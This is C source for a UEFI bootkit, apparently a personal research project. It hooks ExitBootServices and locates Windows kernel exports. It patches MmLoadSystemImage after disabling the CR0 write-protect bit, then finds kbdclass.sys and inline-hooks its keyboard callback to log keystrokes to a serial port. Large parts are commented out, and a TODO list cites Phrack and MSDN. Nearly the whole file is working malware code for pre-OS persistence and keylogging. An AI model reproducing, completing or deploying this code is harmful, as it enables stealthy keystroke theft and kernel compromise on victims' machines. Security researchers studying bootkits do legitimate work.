/**
 * Author: adi arnon.
 * Purpose: Bootkit :)
 * Date: 18/4/2026
 */

/********************************************************
 * Include
 ********************************************************/
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/BaseLib.h>
#include <Library/DebugLib.h>
#include <Guid/EventGroup.h>
#include <IndustryStandard/PeImage.h>
#include <Library/IoLib.h>  
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/PrintLib.h>

#include "Hook.h"
#include "Kernel.h"

/********************************************************
 * Globals
 ********************************************************/
EFI_EXIT_BOOT_SERVICES originalExitBootServices = NULL;
UINT64 winloadReturnAddress = 0;
VOID * kernelBase = 0;
UINT64 g_OriginalMmAddress = 0;
VOID* pCheckDriverCallback = NULL; 
UINT64 g_KeyboardFound = 0; 
LIST_ENTRY *g_PsLoadedModuleList = NULL;
VOID* g_KbdBaseAddress = NULL; 
UINT64 g_KbdCallbackAddr = 0;
VOID* g_TargetKbdAddr = NULL;
VOID* g_VirtualKbdHookPtr = NULL;
VOID* g_OriginalKbdCallback = NULL;
UINT64 g_KeyPressCount = 0;
VOID* g_RuntimeKeyboardHook = NULL;
UINT8 g_OriginalKbdBytes[14];
VOID* g_KeyLoggerPtr = NULL;
/********************************************************
 * Functions
 ********************************************************/
/**
 * TODO:
 * 1) Parse ntoskrnl PE to find any asset you want. (Write func for it)  done!
 * https://ferreirasc.github.io/PE-Export-Address-Table/
 * 
 * 2) Find MmLoadSystemImage hook it using r10. (inline asm, chat)     done!
 * 
 * 3) Every time hook catch check PsLoadedModuleList -> Prase it. Find "kbdclass.sys".
 * https://gist.github.com/muturikaranja/b7d4b59c72611e76aed94b2f0bf33aa2      done! 
 * 
 * 4) Set hook on Kbdclass!KeyboardClassServiceCallBack -> msdn read
 * https://phrack.org/issues/69/15
 * https://learn.microsoft.com/en-us/previous-versions/ff542324(v=vs.85) -> MSDN!!!!!!!
 * 5) Print chars using SerialWrite.
 */
char kbd_US[128] =
{
    0, 27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',
    '\t',
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
    0,
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0, '\\',
    'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0,
    '*',
    0,
    ' ',
    0,
    0, 0, 0, 0, 0, 0, 0, 0,
    0,
    0,
    0,
    0,
    0,
    0,
    '-',
    0,
    0,
    0,
    '+',
    0,
    0,
    0,
    0,
    0,
    0, 0, 0,
    0,
    0,
    0,
};

extern VOID HookEntry(void);
extern VOID MyKeyboardCallbackHook1(void);

UINT8 g_OriginalKbdBytes[14];
BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName);
VOID ScanForKeyboardDriver();
PKLDR_DATA_TABLE_ENTRY FindKbdclassModule();
BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize);
VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize);
BOOLEAN InstallKeyboardHook(VOID* Target);

 
VOID SerialWrite(CHAR8 *str)
{
    while (*str) {
        IoWrite8(COM1_PORT, *str++);
    }
}

VOID SerialWriteHex(UINT64 val)
{
    CHAR8 buf[16 + 3 + 2];
    CHAR8 hex[] = "0123456789ABCDEF";
    buf[0] = '0'; buf[1] = 'x';
    for (INT32 i = 17; i >= 2; i--) {
        buf[i] = hex[val & 0xF];
        val >>= 4;
    }
    buf[18] = '\n'; buf[19] = '\r'; buf[20] = 0;
    SerialWrite(buf);
}

//not in use for now
VOID WriteHook(VOID* Dest, VOID* Src, UINTN Size) {
    SerialWrite("Attempting to disable WP bit...\n\r");
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ULL); 
    
    SerialWrite("Writing bytes to destination...\n\r");
    CopyMem(Dest, Src, Size);
    
    AsmWriteCr0(cr0); 
    SerialWrite("WP bit restored.\n\r");
}

//print, for addresses in kernel
VOID SerialWriteUnicode(UNICODE_STRING* uStr) {
    if (!uStr || !uStr->Buffer) 
        return;
    for (UINT16 i = 0; i < uStr->Length / sizeof(CHAR16); i++) {
        CHAR16 c = uStr->Buffer[i];
        IoWrite8(COM1_PORT, (UINT8)(c & 0xFF)); 
    }
    IoWrite8(COM1_PORT, '\n');
    IoWrite8(COM1_PORT, '\r');
}

//looking for pattern
VOID* FindPattern(IN VOID *Base, IN UINTN Size, IN UINT8 *Pattern, IN UINTN PatternSize)
{
    UINT8 *Start = (UINT8*)Base;
    if (!Base || !Pattern || PatternSize == 0 || Size < PatternSize)
        return NULL;
    
    for (UINTN i = 0; i <= Size - PatternSize; i++)
    {
        if (CompareMem(Start + i, Pattern, PatternSize) == 0)
        {
            return (VOID*)(Start + i);
        }
    }
    return NULL;
}

VOID DumpBytesInline(VOID* Address, UINTN Count) {
    if ((UINTN)Address < 0x10000) return; 

    SerialWrite("Dumping Address: ");
    SerialWriteHex((UINT64)Address);
    SerialWrite("\n\r");

    UINT8* buf = (UINT8*)Address;
    for (UINTN i = 0; i < Count; i++) {
        CHAR8 hex[4];
        const char* chars = "0123456789ABCDEF";
        hex[0] = chars[buf[i] >> 4];
        hex[1] = chars[buf[i] & 0x0F];
        hex[2] = ' ';
        hex[3] = '\0';
        SerialWrite(hex);
        
        if ((i + 1) % 16 == 0) SerialWrite("\n\r"); 
    }
    SerialWrite("\n\r");
}

/*
//finding function by name in Export Table
VOID* EFIAPI FindNtosExportByName(VOID *kernelBase , CHAR8* exportName)
{
    SerialWrite("hello from FindNtosExportByName \n");
    SerialWrite("kernelBase = ");
    SerialWriteHex((UINT64)kernelBase);
    SerialWrite("exportName = ");
    SerialWrite(exportName);
    EFI_IMAGE_DOS_HEADER* DosHeaders = (EFI_IMAGE_DOS_HEADER*)kernelBase;
    EFI_IMAGE_NT_HEADERS64* NtHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)kernelBase + DosHeaders->e_lfanew);
    UINT32 exportDirRva = NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRva == 0) {
            SerialWrite("here \n");
        return NULL;
    }
    EFI_IMAGE_EXPORT_DIRECTORY* ExportDirReal = (EFI_IMAGE_EXPORT_DIRECTORY*)(exportDirRva + (UINT8*)kernelBase);
    UINT32* names = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNames);
    UINT32* functions = (UINT32*)((UINT8*)kernelBase + ExportDirReal -> AddressOfFunctions);
    UINT16* ordinals = (UINT16*)((UINT8*)kernelBase + ExportDirReal -> AddressOfNameOrdinals);

    for (UINT32 i = 0; i < ExportDirReal->NumberOfNames; i++)
    {
        CHAR8* currentName = (CHAR8*)((UINT8*)kernelBase + names[i]);
        if (AsciiStrCmp(currentName, exportName) == 0)
        {
            //found!!!
            UINT32 FuncRVA = functions[ordinals[i]];
            VOID* finalAddress = (VOID*)((UINT8*)kernelBase + FuncRVA);
            SerialWrite("Found Export: ");
            SerialWrite(exportName);
            SerialWrite(" at: ");
            SerialWriteHex((UINT64)finalAddress);
            return finalAddress;
        }
    }
    SerialWrite("Export NOT found\n");
    return NULL;
}


PKLDR_DATA_TABLE_ENTRY FindKbdclassModule()
{
    if (!g_PsLoadedModuleList)
        return NULL;

    LIST_ENTRY* head = g_PsLoadedModuleList;
    LIST_ENTRY* next = head->ForwardLink;
    UINT32 count = 0;
    while (next != head && count < 500)
    {
        PKLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(next, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (module->BaseDllName.Buffer)
        {
            CHAR16* name = module->BaseDllName.Buffer;
            if ((name[0] == L'k' || name[0] == L'K') && (name[1] == L'b' || name[1] == L'B') && (name[2] == L'd' || name[2] == L'D'))
            {
                return module;
            }
        }
        next = next->ForwardLink;
        count++;
    }

    return NULL;
}
*/
/*
//ckeck if the driver is KeyBoardDriver
BOOLEAN IsKeyboardDriverName(UNICODE_STRING* DriverName)
{
    CHAR16* name = DriverName->Buffer;
    UINT16 len = DriverName->Length / 2;

    for (UINT16 i = 0; i < len - 3; i++) {

        if ((name[i] == L'k' || name[i] == L'K') &&
            (name[i + 1] == L'b' || name[i + 1] == L'B') &&
            (name[i + 2] == L'd' || name[i + 2] == L'D'))
        {
            return TRUE;
        }
    }

    return FALSE;
}
*/
/*
VOID EFIAPI CheckDriverCallback(UNICODE_STRING* DriverName)
{
    if (!DriverName || !DriverName->Buffer)
        return;

    if (IsKeyboardDriverName(DriverName))
    {
        if (!g_KeyboardFound)
        {
            SerialWrite("!!! Target Detected: kbdclass is loading, arming scanner... !!!\n\r");
            g_KeyboardFound = 1;
        }
    }

    if (g_KeyboardFound && g_PsLoadedModuleList)
    {
        SerialWrite("\n\r--- Scanning PsLoadedModuleList ---\n\r");

        ScanForKeyboardDriver();
    }
}
*/

/*
BOOLEAN GetTextSection(VOID* ImageBase, VOID** TextBase, UINT32* TextSize)
{
    EFI_IMAGE_DOS_HEADER* dos = (EFI_IMAGE_DOS_HEADER*)ImageBase;
    if (dos->e_magic != 0x5A4D)
        return FALSE;

    EFI_IMAGE_NT_HEADERS64* nt = (EFI_IMAGE_NT_HEADERS64*)((UINT8*)ImageBase + dos->e_lfanew);

    if (nt->Signature != 0x00004550)
        return FALSE;

    EFI_IMAGE_SECTION_HEADER* section = (EFI_IMAGE_SECTION_HEADER*)((UINT8*)nt + sizeof(UINT32) + sizeof(EFI_IMAGE_FILE_HEADER) + nt->FileHeader.SizeOfOptionalHeader);

    for (UINT16 i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        if (CompareMem(section[i].Name, ".text", 5) == 0)
        {
            *TextBase = (UINT8*)ImageBase + section[i].VirtualAddress;
            *TextSize = section[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    return FALSE;
}
*/

VOID* FindKeyboardCallback( VOID* TextBase, UINT32 TextSize)
{
    UINT8 pattern[] =
    {
        0x48, 0x8B, 0xC4,
        0x48, 0x89, 0x58, 0x08,
        0x48, 0x89, 0x70, 0x10,
        0x48, 0x89, 0x78, 0x18,
        0x4C, 0x89, 0x48, 0x20
    };
    PVOID targetAddress = FindPattern(TextBase, TextSize, pattern, sizeof(pattern));
    if (targetAddress != NULL) {
    SerialWrite("Found potential function! Dumping first 16 bytes:\r\n");
    //DumpBytesInline(targetAddress, 16);
    } 

    else {
        SerialWrite("Pattern not found!\r\n");
    }
    return FindPattern(TextBase, TextSize, pattern, sizeof(pattern));

}

VOID DirectInstallMmHook(VOID* TargetFunction)
{
    if (!TargetFunction) return;

    UINT8 HookPatch[13] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, HookEntry
        0x41, 0xFF, 0xE2                                            // jmp r10
    };
    
    *(UINT64*)(HookPatch + 2) = (UINT64)HookEntry; 

    UINT64 cr0 = AsmReadCr0();
    DisableInterrupts();      
    AsmWriteCr0(cr0 & ~0x10000ULL);

    for (int i = 0; i < 13; i++) {
        ((UINT8*)TargetFunction)[i] = HookPatch[i];
    }

    AsmWriteCr0(cr0);
    EnableInterrupts();
}

BOOLEAN InstallKeyboardHook(VOID* Target)
{
    if (!Target || !g_RuntimeKeyboardHook) {
        SerialWrite("Error: Target or RuntimeHook not initialized!\n\r");
        return FALSE;
    }

    g_OriginalKbdCallback = Target;
    SerialWrite("Installing hook at: ");
    SerialWriteHex((UINT64)Target);
    SerialWrite("Jump destination (Virtual): ");
    SerialWriteHex((UINT64)g_RuntimeKeyboardHook);

    UINT8 HookPatch[15] =
    {
        0x49, 0xBA,                          // mov r10, ...
        0,0,0,0,0,0,0,0,                     // placeholder
        0x41, 0xFF, 0xE2,                    // jmp r10
        0x90, 0x90                           // NOPs
    };

    *(UINT64*)(HookPatch + 2) = (UINT64)MyKeyboardCallbackHook1;
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ULL); 
    CopyMem(Target, HookPatch, 15);
    AsmWriteCr0(cr0); 
    
    SerialWrite("Keyboard hook installed successfully!\n\r");
    return TRUE;
}

char upper(char tav)
{
    // a -> A
    return tav - 0x20;
}
// Set to fastcall like windows calling convention.
VOID EFIAPI MyKeyboardCallbackHook(VOID* DeviceObject, KEYBOARD_INPUT_DATA* InputDataStart,KEYBOARD_INPUT_DATA* InputDataEnd, UINT32* InputDataConsumed)
{
    for (; InputDataStart < InputDataEnd; InputDataStart++)
    {
        UINT16 scan_code = InputDataStart->MakeCode;
        char tav = kbd_US[scan_code];
        char string[2] = {tav, '\0'};  
        if (InputDataStart->Flags == KEY_MAKE) 
        {
            SerialWrite(string);
        }
    }
}

// NT_SUCCESS(status = NtInitiatePowerAction(
//         2,
//         2,
//         0,
//         0
//         )))



    // for (KEYBOARD_INPUT_DATA* scan = InputDataStart; scan < InputDataEnd; scan++) {
    //     if (!(scan->Flags & 0x0001)) {
    //         SerialWrite("KBD Hook: Key Pressed! ScanCode: ");
    //         SerialWriteHex((UINT64)scan->MakeCode);
    //     }
    // }
    // CopyMem(g_TargetKbdAddr, g_OriginalKbdBytes, 14);

    // typedef VOID (EFIAPI *KBD_CALLBACK)(VOID*, VOID*, VOID*, VOID*);
    // ((KBD_CALLBACK)g_TargetKbdAddr)(DeviceObject, InputDataStart, InputDataEnd, InputDataConsumed);

    // UINT8 jmpInstructions[14] = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0,0,0,0,0,0,0,0 };
    // *(UINT64*)(&jmpInstructions[6]) = (UINT64)g_VirtualKbdHookPtr;
    // WriteHook(g_TargetKbdAddr, jmpInstructions, 14);

/*
VOID ScanForKeyboardDriver()
{
    PKLDR_DATA_TABLE_ENTRY module = FindKbdclassModule();
    if (!module)
    {
        SerialWrite("kbdclass not found\n\r");
        return;
    }
    g_KbdBaseAddress = module->DllBase;
    SerialWrite("\n\r****************************************\n\r");
    SerialWrite("Base Address: ");
    SerialWriteHex((UINT64)g_KbdBaseAddress);
    SerialWrite("****************************************\n\r\n\r");
    VOID* textBase = NULL;
    UINT32 textSize = 0;

    if (!GetTextSection( g_KbdBaseAddress, &textBase, &textSize))
    {
        SerialWrite("Failed locating .text\n\r");
        g_KeyboardFound = 0;
        return;
    }

    SerialWrite("Found .text section!\n\r");
    SerialWrite("VirtualAddress: ");
    SerialWriteHex((UINT64)textBase);
    SerialWrite("VirtualSize: ");
    SerialWriteHex((UINT64)textSize);
    VOID* callback = FindKeyboardCallback( textBase, textSize);

    if (callback)
    {
        SerialWrite("Candidate callback:\n\r");
        SerialWriteHex((UINT64)callback);
        //SerialWrite("About to read memory...\n\r");
        //DumpBytesInline(callback, 64);
    }
    if (!callback)
    {
        SerialWrite("Pattern Scan Failed - Check Signature !!!\n\r");
        g_KeyboardFound = 0;
        return;
    }
    InstallKeyboardHook(callback);
    g_KeyboardFound = 0;
}
*/

EFI_STATUS InstallPureAsmHook(VOID* TargetFunction)
{
    if (!TargetFunction) 
        return EFI_INVALID_PARAMETER;

    g_OriginalMmAddress = (UINT64)TargetFunction;
    UINT8* ptr = (UINT8*)TargetFunction;

    UINT8 HookPatch[13] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, HookEntry
        0x41, 0xFF, 0xE2                                            // jmp r10
    };
    
    VOID* RuntimeHookAddress = (VOID*)HookEntry; 
    gRT->ConvertPointer(0, &RuntimeHookAddress); 
    VOID* pOriginalAddr = (VOID*)&g_OriginalMmAddress;
    gRT->ConvertPointer(0, &pOriginalAddr);
    pCheckDriverCallback = (VOID*)CheckDriverCallback;
    gRT->ConvertPointer(0, &pCheckDriverCallback);
    VOID* pFlag = (VOID*)&g_KeyboardFound;
    gRT->ConvertPointer(0, &pFlag);
    *(UINT64*)(HookPatch + 2) = (UINT64)RuntimeHookAddress;
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ULL);
    CopyMem(TargetFunction, HookPatch, 13);
    AsmWriteCr0(cr0);

    SerialWrite("Hook installed successfully with JMP r10\n");
    return EFI_SUCCESS;
}
/**
VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
{
    SerialWrite("winloadVA: ");
    SerialWriteHex(winloadReturnAddress);

    // Sig LogOsLanchScanBase func
    UINT8 sig[] = {0x48, 0xB8, 0x77, 0xBE, 0x9F, 0x1A, 0x2F, 0xDD};
     
    VOID * LogOsLanchScanBase = FindPattern((VOID*)winloadReturnAddress,0x10000,sig,sizeof(sig));

    if (LogOsLanchScanBase) {
        SerialWrite("LogOsLanchScanBase: ");
        SerialWriteHex((UINT64)LogOsLanchScanBase);    
    }
    PLOADER_PARAMETER_BLOCK loaderBlock = *(PLOADER_PARAMETER_BLOCK*)(*(UINT32*)(LogOsLanchScanBase + 0x10) + LogOsLanchScanBase + 0x14); 
    if (NULL == loaderBlock)
    {
        SerialWrite("FUCK loaderBlock\n");
    }
    KLDR_DATA_TABLE_ENTRY *kernelEntery =  CONTAINING_RECORD(loaderBlock->LoadOrderListHead.ForwardLink, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    if (kernelEntery) {
        SerialWrite("kernel base address: ");
        SerialWriteHex((UINT64)kernelEntery->DllBase);
        SerialWrite("kernel dump: ");
        SerialWriteHex((UINT64)kernelEntery->DllBase);
        VOID* mmLoadAddress = FindNtosExportByName(kernelEntery->DllBase, "MmLoadSystemImage");
        if (mmLoadAddress) {
            SerialWrite("MmLoadSystemImage found, installing hook...\n");
            InstallPureAsmHook(mmLoadAddress);        
        }
    VOID* psListExport = FindNtosExportByName(kernelEntery->DllBase, "PsLoadedModuleList");

    if (psListExport) {
        g_PsLoadedModuleList = (LIST_ENTRY*)psListExport;
        SerialWrite("PsLoadedModuleList found and initialized!\n\r");
    }
    }
    gRT->ConvertPointer(0, (VOID**)&g_TargetKbdAddr);
    gRT->ConvertPointer(0, (VOID**)&g_PsLoadedModuleList);
    g_RuntimeKeyboardHook = (VOID*)MyKeyboardCallbackHook;
    gRT->ConvertPointer(0, &g_RuntimeKeyboardHook);
}

EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
    // returnAddress is somewhere inside winload.efi!OslFwpKernelSetupPhase1
    winloadReturnAddress = (UINT64)__builtin_return_address(0);
    Print(L"OslFwpKernelSetupPhase1   -> (phys) 0x%p\n", winloadReturnAddress);

    // restore before calling
    gBS->ExitBootServices = originalExitBootServices;

    return originalExitBootServices(ImageHandle, MapKey);
}

VOID DebugCheckAddress(VOID* addr)
{
    EFI_MEMORY_DESCRIPTOR *MemoryMap = NULL;
    UINTN MapSize = 0;
    UINTN MapKey;
    UINTN DescriptorSize;
    UINT32 DescriptorVersion;

    gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion);

    MapSize += 0x1000;
    if (EFI_ERROR(gBS->AllocatePool(EfiBootServicesData, MapSize, (VOID**)&MemoryMap))) {
        Print(L"AllocatePool failed\n");
        return;
    }

    if (EFI_ERROR(gBS->GetMemoryMap(&MapSize, MemoryMap, &MapKey, &DescriptorSize, &DescriptorVersion))) {
        Print(L"GetMemoryMap failed\n");
        return;
    }

    EFI_MEMORY_DESCRIPTOR* desc = MemoryMap;

    for (UINTN i = 0; i < MapSize / DescriptorSize; i++) {
        UINT64 start = desc->PhysicalStart;
        UINT64 end   = start + desc->NumberOfPages * 4096;

        if ((UINT64)addr >= start && (UINT64)addr < end) {
            Print(L"\n[FOUND ADDRESS]\n");
            Print(L"Addr = %p\n", addr);
            Print(L"Type = %d\n", desc->Type);
            Print(L"Start = %lx End = %lx\n", start, end);
        }

        desc = (EFI_MEMORY_DESCRIPTOR*)((UINT8*)desc + DescriptorSize);
    }
}

EFI_STATUS EFIAPI HookEntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_STATUS status;
    EFI_EVENT event;

    Print(L"\n\n\n");
    Print(L"================================================\n");
    Print(L"          BOOTKIT IS RUNNING                     \n");
    Print(L"          HookEntryPoint executed successfully!  \n");
    Print(L"================================================\n\n");

    gBS = SystemTable->BootServices;

    Print(L"[DEBUG] Checking HookEntry address...\n");
    DebugCheckAddress((VOID*)HookEntry);
    
    status = gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &event);

    if (EFI_ERROR(status)) {
        Print(L"[-] CreateEventEx failed: %r\n", status);
        return status;
    }
    Print(L"[+] EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE registered\n");

    originalExitBootServices  = gBS->ExitBootServices;
    gBS->ExitBootServices     = HookedExitBootServices;
    Print(L"[+] HookedExitBootServices registered\n");

    return EFI_SUCCESS;
}
*/